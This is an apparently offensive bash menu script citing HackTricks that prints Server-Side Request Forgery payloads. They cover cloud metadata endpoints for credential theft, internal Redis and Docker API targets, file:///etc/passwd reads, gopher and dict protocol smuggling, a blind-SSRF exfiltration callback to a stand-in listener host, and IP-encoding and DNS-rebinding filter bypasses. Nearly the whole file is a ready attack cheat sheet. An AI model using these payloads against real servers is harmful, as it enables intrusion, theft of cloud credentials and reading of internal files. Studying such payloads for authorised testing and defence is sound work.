#!/bin/bash
# HackTricks Ref: ssrf
# Module: Server-Side Request Forgery (SSRF)

echo -e "${C6}[WEB ATTACK: SERVER_SSRF]${NC}"
echo -e "Reference: https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery"
echo -e "--------------------------------------------------"

echo -e "${C4}Select SSRF Vector:${NC}"
echo "1) Cloud Metadata Exfiltration (AWS, GCP, Azure)"
echo "2) Internal Port Scanning & Service Discovery"
echo "3) Protocol Smuggling (gopher, dict, file)"
echo "4) Blind SSRF Detection (Out-of-band)"
echo "5) Bypass Techniques (IP Encoding, DNS Rebinding)"
echo "0) Exit"

read -p "Selection: " ssrf_opt

case $ssrf_opt in
    1)
        echo -e "\n${C2}[*] Cloud Metadata Endpoints:${NC}"
        echo " - AWS/GCP: http://169.254.169.254/latest/meta-data/"
        echo " - Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01"
        echo " - DigitalOcean: http://169.254.169.254/metadata/v1.json"
        ;;
    2)
        echo -e "\n${C2}[*] Internal Scanning:${NC}"
        echo "Try to hit local services often blocked from outside:"
        echo " - http://localhost:6379 (Redis - Potential RCE)"
        echo " - http://127.0.0.1:2375 (Docker API)"
        echo " - http://192.168.0.1 (Internal Router/Gateway)"
        ;;
    3)
        echo -e "\n${C2}[*] Advanced Protocols:${NC}"
        echo " - file:///etc/passwd (Read local files)"
        echo " - gopher://127.0.0.1:6379/_SET%20key%20value (Manual TCP payload)"
        echo " - dict://127.0.0.1:11211/STAT (Memcached info)"
        ;;
    4)
        echo -e "\n${C2}[*] Blind SSRF (DNS/HTTP Exfiltration):${NC}"
        echo "If the response is not reflected, use a listener:"
        echo " - URL: http://$(hostname).your-interactsh.com"
        echo "Monitor your logs for an incoming connection from the target's IP."
        ;;
    5)
        echo -e "\n${C2}[*] Bypass Cheat Sheet:${NC}"
        echo " - Decimal IP: http://2130706433/ (127.0.0.1)"
        echo " - Hex IP: http://0x7f000001/"
        echo " - Enclosed Alphanumeric: http://①②⑦.⓪.⓪.①"
        echo " - DNS Rebinding: Use a domain that switches between a public and private IP."
        ;;
    *) return ;;
esac

echo -e "\n--------------------------------------------------"
read -p "Press Enter to return..."
